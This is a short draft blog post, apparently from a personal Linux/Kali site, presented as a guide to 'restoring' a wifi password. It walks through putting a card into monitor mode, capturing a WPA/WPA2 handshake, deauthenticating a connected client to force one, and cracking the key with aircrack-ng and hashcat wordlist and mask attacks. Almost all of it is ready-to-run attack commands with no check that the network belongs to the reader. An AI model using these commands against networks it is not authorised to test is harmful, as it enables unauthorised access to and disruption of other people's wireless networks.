---
title: "Restore Wifi Password"
date: 2020-12-25T09:21:04+01:00
year: "2020"
month: "2020/12"
# categories:
#   - Posts
tags:
  - linux
  - kali
  - security
slug: restore-wifi-password
draft: true
---

## STEP 1 - Get Handshake

Check if your wireless card does support monitor mode.  
If you do not see an interface listed then your wireless card does not support monitor mode.

```
airmon-ng
```

---

Put your network device into monitor mode

```
# airmon-ng start wlan0
```

Listen for all nearby beacon frames to get target BSSID and channel

```
# airodump-ng wlan0mon
```

Start listening for the handshake

```
# airodump-ng --channel 6 —-bssid 9C:5C:8E:C9:AB:C0 --write capture/ wlan0mon
```

Optionally deauth a connected client to force a handshake  
`-a` = AP, `-c` = Client

```
# aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 wlan0mon
```

## STEP 2 - Crack password with aircrack-ng / hashcat

Convert .cap to .hccapx

```
# aircrack-ng -j OUT.hccapx IN.cap
```

#### aircrack-ng

```
# aircrack-ng -a2 -b 9C:5C:8E:C9:AB:C0 -w wordlist.txt capture/-01.cap
```

#### hashcat (wordlist)

```
# hashcat -m 2500 capture.hccapx wordlist.txt
```

#### hashcat (brutal-force)

```
# hashcat -m 2500 capture.hccapx -a 3
```

#### hashcat (brutal-force if you know the length of password)

The following command is and example of how your scenario would work with a password of length = 8.

```
# hashcat -m 2500 -a 3 capture.hccapx ?d?d?d?d?d?d?d?d
```

The `-a 3` denotes the "mask attack" (which is bruteforce but more optimized).

The `-m 2500` denotes the type of password used in WPA/WPA2.

The `capture.hccapx` is the .hccapx file you already captured.

The `?d?d?d?d?d?d?d?d` denotes a string composed of 8 digits.

If you want to specify other charsets, these are the following supported by hashcat:

```
?l = abcdefghijklmnopqrstuvwxyz
?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ
?d = 0123456789
?h = 0123456789abcdef
?H = 0123456789ABCDEF
?s = «space»!"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
?a = ?l?u?d?s
?b = 0x00 – 0xff
```
